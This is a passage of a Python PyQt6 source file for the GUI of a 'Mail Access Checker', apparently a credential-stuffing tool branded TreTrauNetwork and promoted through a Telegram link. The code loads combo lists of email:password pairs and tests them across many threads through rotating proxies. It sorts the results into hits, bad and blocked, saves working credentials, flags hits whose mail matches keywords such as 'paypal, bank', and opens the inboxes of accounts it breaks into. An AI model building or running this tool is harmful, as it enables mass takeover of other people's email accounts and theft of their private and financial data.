        p.drawText(0, cy + 18, w, 20, Qt.AlignmentFlag.AlignCenter,
                   f"{self._rate:.1f}/s")
        p.end()


# TreTrauNetwork — Make by @thaituluckkystopdz — big stat label
class BigStat(QFrame):
    def __init__(self, label: str, color: str):
        super().__init__()
        self._color = color
        self.setStyleSheet(
            f"QFrame{{background:#0a0a14;border:1px solid {color}22;"
            f"border-radius:8px;}}"
        )
        lo = QVBoxLayout(self)
        lo.setContentsMargins(14, 10, 14, 10)
        lo.setSpacing(2)

        self._num = QLabel("0")
        self._num.setFont(QFont("Consolas", 26, QFont.Weight.Bold))
        self._num.setStyleSheet(f"color:{color}44;border:none;")
        self._num.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self._lbl = QLabel(label)
        self._lbl.setFont(QFont("Consolas", 8))
        self._lbl.setStyleSheet(f"color:{color}66;border:none;letter-spacing:3px;")
        self._lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)

        lo.addWidget(self._num)
        lo.addWidget(self._lbl)

    def set(self, v: int):
        self._num.setText(f"{v:,}")
        alpha = "ff" if v > 0 else "33"
        self._num.setStyleSheet(f"color:{self._color}{alpha};border:none;")
        self._lbl.setStyleSheet(
            f"color:{self._color}{'88' if v>0 else '44'};border:none;letter-spacing:3px;"
        )


# TreTrauNetwork — Make by @thaituluckkystopdz — dashboard tab
class DashboardTab(QWidget):
    def __init__(self):
        super().__init__()
        root = QVBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # ── top banner ───────────────────────────
        banner = QFrame()
        banner.setFixedHeight(90)
        banner.setStyleSheet(
            f"QFrame{{background:qlineargradient(x1:0,y1:0,x2:1,y2:1,"
            f"stop:0 #090914,stop:0.5 #0d0020,stop:1 #090914);"
            f"border-bottom:1px solid {NEON_PURPLE}44;}}"
        )
        ban_lo = QHBoxLayout(banner)
        ban_lo.setContentsMargins(24, 0, 24, 0)

        left_ban = QVBoxLayout()
        left_ban.setSpacing(2)
        brand = QPushButton("⬡  TreTrauNetwork")
        brand.setFont(QFont("Consolas", 20, QFont.Weight.Bold))
        brand.setStyleSheet(
            f"QPushButton{{background:transparent;color:{NEON_BLUE};"
            f"border:none;text-align:left;padding:0;}}"
            f"QPushButton:hover{{color:{NEON_PURPLE};}}"
        )
        brand.setCursor(Qt.CursorShape.PointingHandCursor)
        brand.clicked.connect(lambda: webbrowser.open(_TG_LINK))
        sub = QLabel("Mail Access Checker  ·  Make by @thaituluckkystopdz")
        sub.setStyleSheet(f"color:{NEON_PURPLE}77;font-size:9px;letter-spacing:3px;")
        left_ban.addWidget(brand)
        left_ban.addWidget(sub)
        ban_lo.addLayout(left_ban, 1)

        tg_btn = QPushButton("⟩ JOIN TELEGRAM")
        tg_btn.setStyleSheet(
            f"QPushButton{{background:{NEON_PURPLE}22;color:{NEON_PURPLE};"
            f"border:1px solid {NEON_PURPLE}66;border-radius:5px;"
            f"padding:8px 16px;font-size:10px;letter-spacing:1px;}}"
            f"QPushButton:hover{{background:{NEON_PURPLE}44;color:#fff;}}"
        )
        tg_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        tg_btn.clicked.connect(lambda: webbrowser.open(_TG_LINK))
        ban_lo.addWidget(tg_btn)
        root.addWidget(banner)

        # ── main content ─────────────────────────
        content = QWidget()
        content.setStyleSheet(f"background:{BG_DARK};")
        c_lo = QVBoxLayout(content)
        c_lo.setContentsMargins(16, 12, 16, 12)
        c_lo.setSpacing(12)

        # row 1: big stats
        row1 = QHBoxLayout(); row1.setSpacing(10)
        self.s_total   = BigStat("TOTAL",   NEON_BLUE)
        self.s_checked = BigStat("CHECKED", NEON_PURPLE)
        self.s_hits    = BigStat("HITS",    NEON_GREEN)
        self.s_block   = BigStat("BLOCK",   NEON_YELLOW)
        self.s_bad     = BigStat("BAD",     "#ff4444")
        self.s_errors  = BigStat("ERRORS",  NEON_ORANGE)
        for s in [self.s_total, self.s_checked, self.s_hits,
                  self.s_block, self.s_bad, self.s_errors]:
            row1.addWidget(s)
        c_lo.addLayout(row1)

        # row 2: ring + pie side by side
        row2 = QHBoxLayout(); row2.setSpacing(12)

        # left: ring + live speed text
        ring_frame = QFrame()
        ring_frame.setStyleSheet(
            f"QFrame{{background:#0a0a14;border:1px solid {BORDER_DIM};border-radius:10px;}}"
        )
        rf_lo = QVBoxLayout(ring_frame)
        rf_lo.setContentsMargins(16, 16, 16, 16)
        rf_lo.setSpacing(6)

        ring_title = QLabel("PROGRESS")
        ring_title.setStyleSheet(
            f"color:{NEON_PURPLE}88;font-size:8px;letter-spacing:3px;"
        )
        ring_title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        rf_lo.addWidget(ring_title)

        self.ring = RingProgress()
        rf_lo.addWidget(self.ring, alignment=Qt.AlignmentFlag.AlignCenter)

        self._speed_lbl = QLabel("0.0 acc/s")
        self._speed_lbl.setStyleSheet(f"color:{NEON_BLUE}88;font-size:9px;")
        self._speed_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        rf_lo.addWidget(self._speed_lbl)

        self._eta_lbl2 = QLabel("ETA: —")
        self._eta_lbl2.setStyleSheet(f"color:{NEON_PURPLE}88;font-size:9px;")
        self._eta_lbl2.setAlignment(Qt.AlignmentFlag.AlignCenter)
        rf_lo.addWidget(self._eta_lbl2)

        row2.addWidget(ring_frame, 1)

        # right: pie chart
        pie_frame = QFrame()
        pie_frame.setStyleSheet(
            f"QFrame{{background:#0a0a14;border:1px solid {BORDER_DIM};border-radius:10px;}}"
        )
        pf_lo = QVBoxLayout(pie_frame)
        pf_lo.setContentsMargins(16, 16, 16, 16)

        pie_title = QLabel("DISTRIBUTION")
        pie_title.setStyleSheet(
            f"color:{NEON_PURPLE}88;font-size:8px;letter-spacing:3px;"
        )
        pie_title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        pf_lo.addWidget(pie_title)

        self.pie = PieChart()
        pf_lo.addWidget(self.pie, 1)
        row2.addWidget(pie_frame, 3)

        c_lo.addLayout(row2, 1)
        root.addWidget(content, 1)

    def refresh(self, stats: Stats, rate: float = 0.0, eta_str: str = ""):
        self.s_total.set(stats.total)
        self.s_checked.set(stats.checked)
        self.s_hits.set(stats.hits)
        self.s_block.set(stats.block)
        self.s_bad.set(stats.bad)
        self.s_errors.set(stats.errors)
        self.pie.set_data(stats.hits, stats.bad, stats.block, stats.errors)
        self.ring.set_data(stats.checked, stats.total, rate)
        self._speed_lbl.setText(f"{rate:.1f} acc/s")
        self._eta_lbl2.setText(f"ETA: {eta_str}" if eta_str else "ETA: —")


# TreTrauNetwork — Make by @thaituluckkystopdz — results tab with filters + search
class ResultsTab(QWidget):
    open_mail_req = pyqtSignal(int)   # source row index

    def __init__(self, model: ResultModel):
        super().__init__()
        self._src_model = model

        lo = QVBoxLayout(self)
        lo.setContentsMargins(6, 6, 6, 6)
        lo.setSpacing(4)

        # filter buttons
        filter_row = QHBoxLayout()
        filter_row.setSpacing(4)
        self._filter_btns: Dict[str, QPushButton] = {}
        for label, status in [("ALL",""),("HITS","HIT"),("BAD","BAD"),
                               ("BLOCK","BLOCK"),("ERROR","ERROR")]:
            btn = QPushButton(label)
            btn.setCheckable(True)
            btn.setFixedHeight(26)
            color = STATUS_COLOR.get(status, NEON_BLUE) if status else NEON_BLUE
            btn.setStyleSheet(
                f"QPushButton{{background:#0d0d20;color:{color}77;"
                f"border:1px solid {color}44;border-radius:3px;font-size:10px;}}"
                f"QPushButton:checked{{background:{color}22;color:{color};"
                f"border-color:{color};}}"
            )
            btn.clicked.connect(lambda _, s=status: self._set_filter(s))
            self._filter_btns[status] = btn
            filter_row.addWidget(btn)
        self._filter_btns[""].setChecked(True)

        filter_row.addStretch()

        # keyword search
        search_lbl = QLabel("🔍 Search:")
        search_lbl.setStyleSheet("color:#666;")
        self._search = QLineEdit()
        self._search.setPlaceholderText("email / keyword…")
        self._search.setFixedWidth(200)
        self._search.setFixedHeight(26)
        self._search.textChanged.connect(self._on_search)
        filter_row.addWidget(search_lbl)
        filter_row.addWidget(self._search)

        lo.addLayout(filter_row)

        # status bar
        status_row = QHBoxLayout()
        self._status_lbl = QLabel("Idle")
        self._status_lbl.setStyleSheet(f"color:{NEON_BLUE};")
        btn_open = QPushButton("Open Mail")
        btn_open.clicked.connect(self._open_selected)
        btn_clr  = QPushButton("Clear")
        btn_clr.clicked.connect(self._src_model.clear)
        status_row.addWidget(self._status_lbl)
        status_row.addStretch()
        status_row.addWidget(btn_open)
        status_row.addWidget(btn_clr)
        lo.addLayout(status_row)

        # table with proxy
        self._proxy = StatusFilterProxy()
        self._proxy.setSourceModel(model)

        self._table = QTableView()
        self._table.setModel(self._proxy)
        self._table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self._table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self._table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self._table.doubleClicked.connect(self._open_selected)
        lo.addWidget(self._table, 1)

    def _set_filter(self, status: str):
        for s, btn in self._filter_btns.items():
            btn.setChecked(s == status)
        self._proxy.set_status(status)

    def _on_search(self, text: str):
        self._proxy.set_keyword(text)

    def _open_selected(self, *_):
        idx = self._table.currentIndex()
        if not idx.isValid(): return
        src_idx = self._proxy.mapToSource(idx)
        row = src_idx.row()
        if self._src_model.get_status(row) != "HIT":
            QMessageBox.information(self, "Info", "Only HIT accounts can open mail viewer.")
            return
        self.open_mail_req.emit(row)

    def set_status_text(self, text: str):
        self._status_lbl.setText(text)


# TreTrauNetwork — Make by @thaituluckkystopdz — proxy tab
_BTN_IMPORT = (
    f"QPushButton{{background:#0d1a0d;color:{NEON_GREEN};border:1px solid {NEON_GREEN}66;"
    f"border-radius:4px;padding:7px 16px;font-size:11px;font-weight:bold;}}"
    f"QPushButton:hover{{background:{NEON_GREEN}22;border-color:{NEON_GREEN};}}"
)
_BTN_TEST = (
    f"QPushButton{{background:#1a0d1a;color:{NEON_PURPLE};border:1px solid {NEON_PURPLE}66;"
    f"border-radius:4px;padding:7px 16px;font-size:11px;font-weight:bold;}}"
    f"QPushButton:hover{{background:{NEON_PURPLE}22;border-color:{NEON_PURPLE};}}"
)
_BTN_CLEAR = (
    f"QPushButton{{background:#1a0d0d;color:#ff4444;border:1px solid #ff444466;"
    f"border-radius:4px;padding:7px 16px;font-size:11px;}}"
    f"QPushButton:hover{{background:#ff444422;border-color:#ff4444;}}"
)

class ProxyTab(QWidget):
    def __init__(self):
        super().__init__()
        lo = QVBoxLayout(self)
        lo.setContentsMargins(12, 12, 12, 12)
        lo.setSpacing(8)

        # header
        hdr = QLabel("◈  PROXY MANAGER")
        hdr.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
        hdr.setStyleSheet(f"color:{NEON_PURPLE};")
        lo.addWidget(hdr)

        top = QHBoxLayout(); top.setSpacing(8)
        self.btn_import = QPushButton("⬆  Import File")
        self.btn_test   = QPushButton("⚡  Test All")
        self.btn_clear  = QPushButton("✕  Clear")
        self.btn_import.setStyleSheet(_BTN_IMPORT)
        self.btn_test.setStyleSheet(_BTN_TEST)
        self.btn_clear.setStyleSheet(_BTN_CLEAR)
        self._lbl = QLabel("0 proxies")
        self._lbl.setStyleSheet(f"color:{NEON_BLUE};font-size:12px;font-weight:bold;")
        self._alive_lbl = QLabel("")
        self._alive_lbl.setStyleSheet(f"color:{NEON_GREEN};font-size:11px;")
        for w in [self.btn_import, self.btn_test, self.btn_clear]:
            top.addWidget(w)
        top.addStretch()
        top.addWidget(self._alive_lbl)
        top.addWidget(self._lbl)
        lo.addLayout(top)

        sp = QSplitter(Qt.Orientation.Horizontal)

        self._txt = QPlainTextEdit()
        self._txt.setPlaceholderText("ip:port\nip:port:user:pass\n(one per line)")
        self._txt.setStyleSheet(
            f"QPlainTextEdit{{background:#0a0a14;color:#c0c0ff;"
            f"border:1px solid {NEON_PURPLE}44;border-radius:4px;font-size:11px;}}"
        )
        sp.addWidget(self._txt)

        self._log = QPlainTextEdit()
        self._log.setReadOnly(True)
        self._log.setStyleSheet(
            f"QPlainTextEdit{{background:#060610;color:#888;"
            f"border:1px solid {BORDER_DIM};border-radius:4px;font-size:10px;}}"
        )
        self._log.setPlaceholderText("Test results appear here…")
        sp.addWidget(self._log)
        sp.setSizes([400, 300])
        lo.addWidget(sp, 1)

        self.btn_import.clicked.connect(self._import)
        self.btn_clear.clicked.connect(self._clear)
        self.btn_test.clicked.connect(self._test)
        self._txt.textChanged.connect(self._count)
        self._worker: Optional[ProxyCheckWorker] = None

    def _import(self):
        path, _ = QFileDialog.getOpenFileName(self, "Open proxy file", "", "Text (*.txt);;All (*)")
        if path:
            with open(path, encoding="utf-8", errors="ignore") as f:
                self._txt.setPlainText(f.read())

    def _clear(self):
        self._txt.clear(); self._log.clear()
        self._alive_lbl.setText(""); self._lbl.setText("0 proxies")

    def _count(self):
        n = len([l for l in self._txt.toPlainText().splitlines() if l.strip()])
        self._lbl.setText(f"{n} proxies")

    def _test(self):
        lines = [l.strip() for l in self._txt.toPlainText().splitlines() if l.strip()]
        if not lines: return
        self._log.clear()
        self._alive_lbl.setText(f"Testing {len(lines)}…")
        self._worker = ProxyCheckWorker(list(enumerate(lines)))
        self._worker.result_sig.connect(self._on_result)
        self._worker.done_sig.connect(self._on_done)
        self._worker.start()

    def _on_result(self, idx: int, status: str, ip: str):
        lines = self._txt.toPlainText().splitlines()
        proxy = lines[idx] if idx < len(lines) else "?"
        color = NEON_GREEN if status == "ALIVE" else "#ff4444"
        self._log.appendPlainText(f"[{status}] {proxy[:45]}  {ip}")

    def _on_done(self, alive: int, dead: int):
        self._alive_lbl.setText(f"✓ Alive: {alive}  ✗ Dead: {dead}")

    def get_proxies(self) -> List[str]:
        return [l.strip() for l in self._txt.toPlainText().splitlines() if l.strip()]


# TreTrauNetwork — Make by @thaituluckkystopdz — button styles
_START_STYLE = (
    "QPushButton{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,"
    "stop:0 #00cc66,stop:1 #00ff88);color:#000;font-weight:bold;"
    "font-size:14px;border:2px solid #00ffaa;border-radius:5px;padding:10px;}"
    "QPushButton:hover{background:#00ff88;}"
)
_STOP_STYLE = (
    "QPushButton{background:#330000;color:#ff4444;font-weight:bold;"
    "font-size:14px;border:2px solid #ff2222;border-radius:5px;padding:10px;}"
    "QPushButton:hover{background:#550000;}"
)


# TreTrauNetwork — Make by @thaituluckkystopdz — main window
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Mail Access Checker v1.0 — TreTrauNetwork")
        self.resize(1240, 740)
        self.setStyleSheet(QSS)

        self._stats    = Stats()
        self._model    = ResultModel()
        self._worker:  Optional[CheckWorker] = None
        self._save_dir = os.path.dirname(os.path.abspath(__file__))
        self._run_folder = ""
        self._start_ts = 0.0

        self._build_ui()
        self._timer = QTimer()
        self._timer.timeout.connect(self._tick)

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        root = QHBoxLayout(central)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # TreTrauNetwork — sidebar
        sidebar = QFrame()
        sidebar.setFixedWidth(235)
        sidebar.setStyleSheet(f"QFrame{{background:#090914;border-right:1px solid {NEON_PURPLE}33;}}")
        sb = QVBoxLayout(sidebar)
        sb.setContentsMargins(10, 16, 10, 10)
        sb.setSpacing(8)

        logo = QPushButton("⬡  IMAP\nCHECKER")
        logo.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
        logo.setStyleSheet(
            f"QPushButton{{background:transparent;color:{NEON_BLUE};"
            f"border:none;text-align:center;}}"
            f"QPushButton:hover{{color:{NEON_PURPLE};}}"
        )
        logo.setCursor(Qt.CursorShape.PointingHandCursor)
        logo.setCursor(Qt.CursorShape.PointingHandCursor)
        logo.clicked.connect(lambda: webbrowser.open(_TG_LINK))
        sb.addWidget(logo)
        sb.addWidget(self._sep())

        sb.addWidget(self._lbl("Combo File (email:pass)"))
        self._combo_edit = QLineEdit()
        self._combo_edit.setPlaceholderText("path/to/combo.txt")
        sb.addWidget(self._combo_edit)
        btn_browse = QPushButton("Browse…")
        btn_browse.clicked.connect(self._browse_combo)
        sb.addWidget(btn_browse)
        sb.addWidget(self._sep())

        sb.addWidget(self._lbl("Keyword (keybrowser filter)"))
        self._kw_edit = QLineEdit()
        self._kw_edit.setPlaceholderText("e.g. paypal, bank…")
        sb.addWidget(self._kw_edit)
        sb.addWidget(self._sep())

        sb.addWidget(self._lbl("Threads"))
        self._spin = QSpinBox(); self._spin.setRange(1, 300); self._spin.setValue(50)
        sb.addWidget(self._spin)

        sb.addWidget(self._lbl("Save folder"))
        self._save_lbl = QLabel(self._save_dir)
        self._save_lbl.setWordWrap(True)
        self._save_lbl.setStyleSheet("color:#555;font-size:8px;")
        sb.addWidget(self._save_lbl)
        btn_pick = QPushButton("Change…"); btn_pick.clicked.connect(self._pick_save)
        sb.addWidget(btn_pick)
        sb.addWidget(self._sep())

        self._btn_start = QPushButton("▶  START")
        self._btn_start.setStyleSheet(_START_STYLE)
        self._btn_start.clicked.connect(self._start_stop)
        sb.addWidget(self._btn_start)

        self._prog = QProgressBar(); self._prog.setValue(0)
        sb.addWidget(self._prog)

        self._eta_lbl = QLabel("ETA: —")
        self._eta_lbl.setStyleSheet(f"color:{NEON_PURPLE};font-size:9px;")
        sb.addWidget(self._eta_lbl)

        sb.addStretch()
        ver = QLabel("TreTrauNetwork  v2.0")
        ver.setStyleSheet(f"color:{NEON_PURPLE}44;font-size:8px;")
        ver.setAlignment(Qt.AlignmentFlag.AlignCenter)
        sb.addWidget(ver)

        root.addWidget(sidebar)

        # TreTrauNetwork — tabs
        tabs = QTabWidget()
        root.addWidget(tabs, 1)

        self._dash = DashboardTab()
        tabs.addTab(self._dash, "Dashboard")

        self._res_tab = ResultsTab(self._model)
        self._res_tab.open_mail_req.connect(self._open_mail_row)
        tabs.addTab(self._res_tab, "Results")

        self._proxy_tab = ProxyTab()
        tabs.addTab(self._proxy_tab, "Proxies")

        self._tabs = tabs

    def _sep(self):
        f = QFrame(); f.setFrameShape(QFrame.Shape.HLine)
        f.setStyleSheet(f"border:1px solid {BORDER_DIM};"); return f

    def _lbl(self, text: str) -> QLabel:
        l = QLabel(text); l.setStyleSheet("color:#555;font-size:9px;"); return l

    def _browse_combo(self):
        path, _ = QFileDialog.getOpenFileName(self, "Combo file", "", "Text (*.txt);;All (*)")
        if path: self._combo_edit.setText(path)

    def _pick_save(self):
        d = QFileDialog.getExistingDirectory(self, "Save folder", self._save_dir)
        if d: self._save_dir = d; self._save_lbl.setText(d)

    def _start_stop(self):
        if self._worker and self._worker.isRunning():
            self._worker.stop()
            self._timer.stop()
            self._btn_start.setText("▶  START")
            self._btn_start.setStyleSheet(_START_STYLE)
            return

        path = self._combo_edit.text().strip()
        if not path or not os.path.exists(path):
            QMessageBox.warning(self, "Error", "Select a valid combo file first."); return

        combos = []
        with open(path, encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if ":" not in line: continue
                em, _, pw = line.partition(":")
                if em and pw: combos.append((em.strip(), pw.strip()))

        if not combos:
            QMessageBox.warning(self, "Error", "No valid combos found."); return

        self._model.clear()
        self._stats.reset()
        self._stats.total = len(combos)
        self._prog.setMaximum(len(combos)); self._prog.setValue(0)
        self._start_ts   = time.time()
        self._run_folder = _make_save_dir(self._save_dir)

        for em, pw in combos:
            self._model.add_row(em, pw, "WAIT")

        proxies = [parse_proxy(x) for x in self._proxy_tab.get_proxies()]
        rotator = ProxyRotator([p for p in proxies if p])
        kw      = self._kw_edit.text().strip()

        indexed = [(i, em, pw) for i,(em,pw) in enumerate(combos)]
        self._worker = CheckWorker(indexed, self._spin.value(), rotator, kw)
        self._worker.row_done.connect(self._on_row_done)
        self._worker.progress.connect(self._on_progress)
        self._worker.finished.connect(self._on_finished)
        self._worker.start()

        self._btn_start.setText("■  STOP")
        self._btn_start.setStyleSheet(_STOP_STYLE)
        self._timer.start(1000)

    def _on_row_done(self, idx: int, status: str, mcnt: int, preview: str):
        self._model.update_row(idx, status, mcnt, preview)
        self._stats.checked += 1
        email  = self._model.get_email(idx)
        pwd    = self._model.get_pass(idx)
        domain = email.split("@")[-1] if "@" in email else "unknown"
        kw     = self._kw_edit.text().strip()

        if status == "HIT":
            self._stats.hits += 1
            line = f"{email}:{pwd}  [{mcnt} mails]  {preview}"
            _save_line(self._run_folder, "hits.txt", line)
            _save_domain(self._run_folder, domain, line)
            if kw and kw.lower() in preview.lower():
                _save_keybrowser(self._run_folder, kw, email, pwd, preview)
        elif status == "BAD":
            self._stats.bad += 1
            _save_line(self._run_folder, "bad.txt", f"{email}:{pwd}")
        elif status == "BLOCK":
            self._stats.block += 1
            _save_line(self._run_folder, "block.txt", f"{email}:{pwd}  {preview}")
        else:
            self._stats.errors += 1

        self._refresh_dash()
        self._res_tab.set_status_text(
            f"Checked {self._stats.checked}/{self._stats.total}  |  "
            f"Hits: {self._stats.hits}  Block: {self._stats.block}  "
            f"Bad: {self._stats.bad}  Err: {self._stats.errors}"
        )

    def _on_progress(self, _):
        self._prog.setValue(self._stats.checked)

    def _on_finished(self, hits, bad, block, errors):
        self._timer.stop()
        self._btn_start.setText("▶  START")
        self._btn_start.setStyleSheet(_START_STYLE)
        self._eta_lbl.setText("Done")
        self._refresh_dash(force_rate=0.0, force_eta="Done")
        self._res_tab.set_status_text(
            f"Done  —  Hits: {hits}  Block: {block}  Bad: {bad}  Errors: {errors}"
        )

    def _refresh_dash(self, force_rate: Optional[float] = None,
                      force_eta: Optional[str] = None):
        done  = self._stats.checked
        total = self._stats.total
        rate  = 0.0
        eta_s = ""
        if done > 0 and self._start_ts > 0:
            elapsed = time.time() - self._start_ts
            rate    = done / elapsed if elapsed > 0 else 0.0
            if total > done and rate > 0:
                secs   = (total - done) / rate
                m, s   = divmod(int(secs), 60)
                eta_s  = f"{m}m {s}s"
        if force_rate is not None: rate  = force_rate
        if force_eta  is not None: eta_s = force_eta
        self._dash.refresh(self._stats, rate, eta_s)

    def _tick(self):
        done  = self._stats.checked
        total = self._stats.total
        if done > 0 and total > done:
            elapsed = time.time() - self._start_ts
            rate    = done / elapsed if elapsed > 0 else 0.0
            eta     = (total - done) / rate if rate > 0 else 0
            m, s    = divmod(int(eta), 60)
            self._eta_lbl.setText(f"ETA {m}m {s}s  ({rate:.1f}/s)")
        self._refresh_dash()

    def _open_mail_row(self, row: int):
        # show() is non-blocking — UI stays responsive immediately
        self._mail_viewers = getattr(self, "_mail_viewers", [])
        dlg = MailViewer(None, self._model.get_email(row), self._model.get_pass(row))
        dlg.setAttribute(Qt.WidgetAttribute.WA_DeleteOnClose)
        dlg.finished.connect(lambda: self._mail_viewers.remove(dlg)
                             if dlg in self._mail_viewers else None)
        self._mail_viewers.append(dlg)
        dlg.show()


# TreTrauNetwork — Make by @thaituluckkystopdz — entry point
def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    win = MainWindow()
    win.show()
    sys.exit(app.exec())

if __name__ == "__main__":
    main()
